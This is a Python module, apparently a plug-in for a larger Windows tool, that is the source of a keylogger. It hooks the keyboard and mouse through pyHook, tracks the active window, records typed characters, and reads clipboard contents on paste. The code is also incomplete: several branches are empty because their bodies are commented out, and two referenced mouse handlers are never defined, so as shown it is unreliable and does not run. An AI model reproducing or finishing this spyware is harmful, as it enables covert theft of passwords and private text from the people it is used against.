#module to log key strokes, can log data after expiration or at intevals indefinately
#windows only
import pythoncom #library for com automation (windows)
import pyHook #library for windows input hooks
import win32clipboard
#from ctypes import * #need to check if this works with dynamic import, may need to just import or use alias

#ctypes was only used to get wondow name which we dont need
#user32 = windll.user32
#kernel32 = windll.kernel32
#psapi = windll.psapi
current_window = None

#callback on keystroke
def KeyStroke(event):
	global current_window

	#check if current window has changed
	if event.WindowName != current_window:
		current_window = event.WindowName
		#print current_window

	if event.Ascii > 32 and event.Ascii < 127: #standard key
		#print chr(event.Ascii)
	else:
		#get clipboard if ctrl-v
		if event.Key == "V": #need to test for paste
			win32clipboard.OpenClipboard()
			pasted = win32clipboard.GetClipboardData()
			win32clipboard.CloseClipboard()

			#print pasted
		else:
			#print event.Key #was format string

	return True #pass execution to next hook in queue

def run(config, **args):
	kl = pyHook.HookManager() #create hook manager
	kl.KeyDown = KeyStroke #register callback on keydown
	kl.MouseLeftDown = MouseLeft #register callback on mouse
	kl.MouseRightDown = MouseRight
	
	kl.HookKeyboard()
	pythoncom.PumpMessages() #execute forever, put in separate thread so we can return
	#need to UnhookMouse and keyboard before return
